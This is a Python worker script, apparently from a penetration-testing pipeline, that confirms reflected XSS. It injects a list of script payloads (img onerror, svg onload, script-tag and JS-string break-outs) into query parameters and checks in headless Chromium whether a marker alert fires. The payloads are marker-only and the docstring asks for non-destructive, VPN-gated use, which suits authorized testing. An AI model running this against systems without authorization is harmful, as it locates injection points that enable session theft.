#!/usr/bin/env python3
"""xss_confirm_worker.py — confirm a REFLECTED value actually EXECUTES as XSS.

The article's accuracy lesson: "detection is not exploitation." recon_params only
proves a canary REFLECTS in the body (a LEAD). This worker loads the URL in headless
Chromium (Playwright) with a unique marker payload and reports whether the injected
JavaScript truly RUNS (an alert dialog firing with our exact marker). That turns
"reflected" into CONFIRMED — or rejects it as reflected-not-exploitable.

Discipline (hard line): UNAUTHENTICATED (no cookies/creds), NON-DESTRUCTIVE (a marker
alert only; the dialog is dismissed; nothing is read, sent, or persisted on the
target). One URL in, one JSON line out. Target-facing -> caller must be VPN-gated.

Usage: xss_confirm_worker.py <url-with-query-params>
Env:   XSS_NAV_TIMEOUT_MS (12000) XSS_SETTLE_MS (1200) XSS_MAX_PARAMS (4)
"""
import os, sys, json, uuid
import urllib.parse as up

NAV_TIMEOUT = int(os.environ.get("XSS_NAV_TIMEOUT_MS", "12000"))
SETTLE_MS   = int(os.environ.get("XSS_SETTLE_MS", "1200"))
MAX_PARAMS  = int(os.environ.get("XSS_MAX_PARAMS", "4"))


def _payloads(marker):
    a = f"alert('{marker}')"
    # cover the common reflection contexts: attribute break-out, raw HTML, in-script,
    # single/double quoted JS string. Marker-only; no data exfil, no navigation.
    return [
        f'"><img src=x onerror={a}>',
        f'"><svg onload={a}>',
        f'</script><script>{a}</script>',
        f"'><script>{a}</script>",
        f'";{a};//',
        f"';{a};//",
    ]


def _build(pu, q, idx, payload):
    nq = list(q)
    nq[idx] = (q[idx][0], payload)
    return up.urlunparse(pu._replace(query=up.urlencode(nq, doseq=True)))


def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "usage: xss_confirm_worker.py <url>"})); return 2
    url = sys.argv[1]
    res = {"url": url, "executed": False}
    pu = up.urlparse(url)
    q = up.parse_qsl(pu.query, keep_blank_values=True)
    if not q:
        res["skip"] = "no-query-params"; print(json.dumps(res)); return 0
    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        print(json.dumps({"url": url, "error": f"playwright-missing: {e}"})); return 3

    fired = []
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
        ctx = browser.new_context(ignore_https_errors=True)
        page = ctx.new_page()

        def _on_dialog(d):
            try:
                fired.append(d.message)
            finally:
                try: d.dismiss()
                except Exception: pass
        page.on("dialog", _on_dialog)

        try:
            for idx, (param, _v) in enumerate(q[:MAX_PARAMS]):
                for tmpl in range(6):
                    marker = "XC" + uuid.uuid4().hex[:10]
                    payload = _payloads(marker)[tmpl]
                    poc = _build(pu, q, idx, payload)
                    fired.clear()
                    try:
                        page.goto(poc, timeout=NAV_TIMEOUT, wait_until="load")
                        page.wait_for_timeout(SETTLE_MS)
                    except Exception:
                        pass
                    if marker in fired:
                        res.update(executed=True, param=param, payload=payload,
                                   marker=marker, context="js-dialog", poc_url=poc)
                        print(json.dumps(res))
                        try: browser.close()
                        except Exception: pass
                        return 0
        finally:
            try: browser.close()
            except Exception: pass
    print(json.dumps(res))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
